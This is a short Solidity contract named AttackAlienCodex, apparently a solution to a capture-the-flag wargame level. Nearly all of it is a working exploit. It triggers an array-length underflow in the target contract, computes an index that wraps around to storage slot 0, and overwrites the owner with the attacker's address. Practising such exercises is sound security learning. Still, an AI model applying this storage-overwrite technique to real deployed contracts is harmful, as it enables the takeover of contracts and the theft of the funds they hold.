// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./AlienCodex.sol";

contract AttackAlienCodex {
    address victim;

    constructor(address _victim) public {
        victim = _victim;
    }

    function attack() public {
        AlienCodex(victim).make_contact();
        AlienCodex(victim).retract();

        uint256 keccak_1 = uint256(keccak256(abi.encode(1)));
        uint256 i = 2**256 - 1 - keccak_1 + 1; // without the -1 +1: TypeError: Operator - not compatible with types int_const 1157...(70 digits omitted)...9936 and uint256 and TypeError: Type int_const 1157...(70 digits omitted)...9936 is not implicitly convertible to expected type uint256. Literal is too large to fit in uint256.
        AlienCodex(victim).revise(i, bytes32(uint256(msg.sender)));
    }
}
